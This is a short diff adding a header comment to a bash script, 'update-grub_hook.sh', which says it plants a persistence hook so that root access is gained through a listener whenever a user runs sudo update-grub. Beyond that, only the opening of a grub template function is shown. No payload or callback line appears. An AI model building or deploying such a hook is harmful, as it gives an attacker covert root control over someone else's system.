@@ -1,5 +1,12 @@
 #!/bin/bash
 
+##################################################################################################
+# update-grub_hook.sh                                                                            #
+# Gain persistence through update-grub                                                           #
+# Every time user tries sudo update-grub command we gain root access if we set a listener first  #
+# by 0bfxgh0st*                                                                                  #
+##################################################################################################
+
 function _grub_template_pt1_(){
 cat << 'EOF'
 # If you change this file, run 'update-grub' afterwards to update
